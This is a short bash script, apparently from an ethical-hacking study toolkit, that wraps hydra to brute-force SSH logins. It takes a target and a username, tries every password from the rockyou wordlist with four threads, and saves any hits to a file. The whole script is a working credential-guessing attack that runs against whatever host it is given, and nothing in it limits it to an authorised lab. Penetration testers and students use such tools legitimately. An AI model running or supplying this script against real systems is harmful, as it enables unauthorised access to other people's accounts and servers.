#!/bin/bash
set -euo pipefail

if [ $# -lt 2 ]; then
  echo "Usage: hydra_ssh.sh <target> <username>"
  exit 1
fi

TARGET=$1
USER=$2
WORDLIST=~/ceh-tools/wordlists/rockyou.txt
OUTFILE=hydra_ssh_${TARGET}_${USER}.txt

hydra -L <(echo "$USER") -P "$WORDLIST" -t 4 ssh://"$TARGET" -o "$OUTFILE"
echo "[*] Results saved to $OUTFILE"
